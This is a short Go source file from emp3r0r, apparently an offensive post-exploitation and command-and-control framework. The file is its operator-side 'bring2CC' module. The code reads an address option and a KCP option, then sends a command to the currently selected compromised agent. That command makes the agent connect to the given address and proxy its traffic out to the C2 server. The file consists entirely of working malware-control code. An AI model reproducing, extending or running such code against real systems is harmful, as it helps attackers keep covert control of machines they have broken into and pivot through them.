//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func moduleBring2CC() {
	addrOpt, ok := Options["addr"]
	if !ok {
		CliPrintError("Option 'addr' not found")
		return
	}
	addr := addrOpt.Val

	kcpOpt, ok := Options["kcp"]
	if !ok {
		CliPrintError("Option 'kcp' not found")
		return
	}
	use_kcp := kcpOpt.Val

	cmd := fmt.Sprintf("%s --addr %s --kcp %s", emp3r0r_data.C2CmdBring2CC, addr, use_kcp)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliPrintInfo("agent %s is connecting to %s to proxy it out to C2", CurrentTarget.Tag, addr)
}
